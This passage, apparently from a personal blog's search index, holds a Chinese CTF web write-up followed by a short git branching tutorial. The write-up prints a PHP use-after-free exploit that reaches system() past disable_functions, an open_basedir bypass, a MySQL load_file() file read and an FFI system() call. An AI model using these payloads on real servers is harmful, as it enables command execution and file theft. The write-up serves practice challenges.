class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">ctfshow</span>(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h4 id="web73">web73</h4><p>同71。</p><h4 id="web74">web74</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();     <span class="hljs-comment">//返回输出缓冲区的内容</span><br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();             <span class="hljs-comment">//清空（擦除）缓冲区并关闭输出缓冲</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>); <span class="hljs-comment">//内容匹配到数字字母的时候用？代替</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这次scandir()被禁止，使用绕过open_basedir的用法一遍历目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;;<span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure><p>后续使用include()函数读取文件即可。</p><h4 id="web75">web75</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();     <span class="hljs-comment">//返回输出缓冲区的内容</span><br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();             <span class="hljs-comment">//清空（擦除）缓冲区并关闭输出缓冲</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>); <span class="hljs-comment">//内容匹配到数字字母的时候用？代替</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>采用目录遍历的方法读取根目录,同上。</p><p>include()函数被open_dir函数禁止，使用UAF脚本发现strlen()被禁止。</p><p>本地借助mysql的loadfile()函数来读取文件，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment"># 创建 PDO 实例, 连接 MySQL 数据库</span><br>    <span class="hljs-comment">#数据库名称ctftraining，用户名root，密码root</span><br><span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br><br><span class="hljs-comment"># 在 MySQL 中，load_file(完整路径) 函数读取一个文件并将其内容作为字符串返回。</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>) &#123;<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>;<br>&#125;<br><span class="hljs-comment">#释放PDO实例</span><br><span class="hljs-variable">$dbh</span> = <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-comment">#异常信息输出</span><br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>对上述脚本进行url编码传参即可</p><figure><img src="/2024/12/03/Web/1733230595105.png" alt="1733230595105"><figcaption aria-hidden="true">1733230595105</figcaption></figure><h4 id="web76">web76</h4><p>同上。</p><h4 id="web77">web77</h4><p>本题同样使用目录遍历+glob协议的方式或许文件路径，但本题数据库不可用，利用FFI来绕过php对system()函数的限制。</p><p><strong>知识点：</strong></p><p>PHP FFI（Foreign Function Interface）是一个强大的功能，允许 PHP程序直接调用 C 语言编写的函数和使用 C 语言的数据结构。这使得 PHP能够利用 C 库的性能和功能，扩展其能力。但仅支持php7.4 以上。</p><p>使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#定义</span><br><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br><span class="hljs-comment">#调用</span><br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br></code></pre></td></tr></table></figure><p>C语言库下的system()函数：</p><figure><img src="/2024/12/03/Web/1733230615735.png" alt="1733230615735"><figcaption aria-hidden="true">1733230615735</figcaption></figure><p>该命令不会回显命令执行的内容，我们需要利用写通道查看回显。</p><p>首先尝试读取flag36x.txt，发现内容为空：</p><figure><img src="/2024/12/03/Web/1733230632235.png" alt="1733230632235"><figcaption aria-hidden="true">1733230632235</figcaption></figure><p>访问readflag，成功找到flag:</p><figure><img src="/2024/12/03/Web/1733230650412.png" alt="1733230650412"><figcaption aria-hidden="true">1733230650412</figcaption></figure><h4 id="web118">web118</h4><figure><img src="/2024/12/03/Web/1733230687906.png" alt="1733230687906"><figcaption aria-hidden="true">1733230687906</figcaption></figure><p>命令执行:system($code)</p><p>尝试发现：</p><p>过滤了小写字母，数字，/等一些符号；可以利用的字符有：大写字母，：，$，{}，？，空格，.</p><p>可以采用环境变量字符串截取的方式执行命令，如下尝试：</p><figure><img src="/2024/12/03/Web/1733230706270.png" alt="1733230706270"><figcaption aria-hidden="true">1733230706270</figcaption></figure><p>可以发现：</p><ul><li>A可以发挥0的作用，${PATH:~A}默认截取一个字符；</li><li>利用环境变量PATH获取n；利用环境变量PWD（/var/www/html）获取l；</li><li>flag采用？进行匹配。</li><li>payload如下：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;PATH:~A&#125;<span class="hljs-variable">$&#123;PWD:~A&#125;</span> ????.???</span><br></code></pre></td></tr></table></figure><h4 id="web119">web119</h4><p>在上题的基础上过滤了PATH，</p><ol type="1"><li>另外一些环境变量的常用值：</li></ol><p><code>$&#123;PWD&#125;</code> ：/var/www/html <code>$&#123;USER&#125;</code>：www-data</p><p><code>$&#123;PHP_VERSION&#125;</code></p><ol start="2" type="1"><li>可以采用<strong>特殊字符</strong>构造数字:</li></ol><ul><li><span class="math inline">\((())：0；\)</span>((<sub><span class="math inline">\((())))：-1;\)</span>((</sub><span class="math inline">\(((~\)</span>(())))))通常用于构造较大的数字，本题被禁用</li><li><span class="math inline">\(或\)</span></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git多人合作</title>
    <link href="/2024/12/01/git%E5%A4%9A%E4%BA%BA%E5%90%88%E4%BD%9C/"/>
    <url>/2024/12/01/git%E5%A4%9A%E4%BA%BA%E5%90%88%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>参考：https://www.bilibili.com/video/BV1UB4y1Z7Jg/?spm_id_from=333.337.search-card.all.click&amp;vd_source=a8de5b20aced8e4ba8bfa351984edc3b</p><h4 id="查看分支">查看分支</h4><p>远程仓库克隆时，Git默认把本地的master分支和远程的master分支对应</p><p>仓库克隆命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone (ssh链接)<br></code></pre></td></tr></table></figure><p>查看分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git branch<br></code></pre></td></tr></table></figure><p>查看远程仓库信息：(仓库分支)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git remote -v<br></code></pre></td></tr></table></figure><h4 id="推送分支新建分支">推送分支(新建分支)</h4><p>命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git push (仓库名) (分支名)<br></code></pre></td></tr></table></figure><h3 id="在dev分支上协作开发抓取远程分支">在dev分支上协作开发，抓取远程分支</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git checkout -b dev<br></code></pre></td></tr></table></figure><h4 id="提交文件">提交文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git add &quot;xxx&quot;<br></code></pre></td></tr></table></figure><h4 id="推送本地">推送本地</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git commit -m &quot;xxx&quot;<br></code></pre></td></tr></table></figure><h4 id="推送远程">推送远程</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git push (仓库名) (分支名)<br></code></pre></td></tr></table></figure><p>如果远程代码更新，需要先<code>git pull</code> 解决冲突</p><p>Pycharm提供操作快捷键，比较方便。</p>]]></content>
    
    
    
    <tags>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
